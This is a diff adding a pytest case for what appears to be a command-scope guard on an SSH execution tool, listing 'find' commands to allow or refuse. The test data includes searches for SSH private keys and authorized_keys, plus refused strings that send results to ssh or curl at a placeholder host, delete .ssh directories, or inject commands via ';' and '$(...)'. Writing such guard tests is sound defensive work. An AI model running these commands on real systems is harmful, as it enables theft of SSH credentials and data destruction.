@@ -173,3 +173,26 @@ def test_network_named_directory_does_not_hide_a_real_network_command(command, a
         "ssh_exec", {"ip": "192.0.2.11", "command": command}, SUBNET,
     )
     assert (refusal is None) is allowed
+
+
+@pytest.mark.parametrize("command,allowed", [
+    ("find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' -o -name '.ssh' 2>/dev/null | head -10", True),
+    ("find /root /home -name '.ssh' -type d -maxdepth 5", True),
+    ("find /home -iname 'ssh' -type f -perm -4000 | tail -5", True),
+    ("find / -name '.ssh' -exec /usr/bin/ssh outside.invalid +", False),
+    ("find / -name '.ssh' -execdir /usr/bin/curl outside.invalid +", False),
+    ("find / -name '.ssh' -ok /usr/bin/ssh outside.invalid +", False),
+    ("find / -name '.ssh' -delete", False),
+    ("find / -name '.ssh' -fprint /tmp/ssh", False),
+    ("find / -name '*.ssh'", False),
+    ("find / -name '.ssh' | /usr/bin/ssh outside.invalid", False),
+    ("find / -name '.ssh'; ssh outside.invalid", False),
+    ('find / -name ".ssh $PATTERN"', False),
+    ("find $(ssh outside.invalid) -name '.ssh'", False),
+    ("find / -name '.ssh", False),
+])
+def test_static_find_names_are_data_without_execution_or_dynamic_arguments(command, allowed):
+    refusal = _intrusion_scope_violation(
+        "ssh_exec", {"ip": "192.0.2.11", "command": command}, SUBNET,
+    )
+    assert (refusal is None) is allowed
